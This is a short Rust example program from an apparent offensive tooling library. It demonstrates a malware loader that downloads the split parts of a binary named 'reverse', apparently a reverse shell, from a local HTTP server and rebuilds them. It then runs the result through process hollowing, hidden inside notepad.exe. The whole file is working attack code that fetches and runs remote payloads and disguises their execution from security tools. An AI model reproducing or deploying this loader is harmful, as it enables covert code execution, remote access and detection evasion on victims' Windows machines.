//! Demonstrates Process Hollowing execution method
fn main() {
    use mounterlib::{
        download::http::download_all_as_map, execution::execute_with_process_hollowing,
        reconstruct::rebuild_from_parts,
    };

    // Download URLs
    let urls = [
        "http://127.0.0.1/reverse.part000".to_string(),
        "http://127.0.0.1/reverse.part001".to_string(),
    ];

    println!("[+] Downloading parts...");
    let parts =
        download_all_as_map(&urls, 30, "Mozilla/5.0", false).expect("Failed to download parts");

    println!("[+] Downloaded {} parts", parts.len());
    println!("[+] Reconstructing binary...");
    let binary = rebuild_from_parts(parts, true, false).expect("Failed to reconstruct binary");
    println!("[+] Reconstructed binary: {} bytes", binary.len());
    println!("[+] Executing binary with Process Hollowing...");

    // Target process to hollow - can be any legitimate Windows binary
    let target = "C:\\Windows\\System32\\notepad.exe";
    match execute_with_process_hollowing(&binary, target, true) {
        Ok(_) => println!("[+] Process hollowing completed successfully"),
        Err(e) => eprintln!("[-] Failed to execute: {}", e),
    }
}
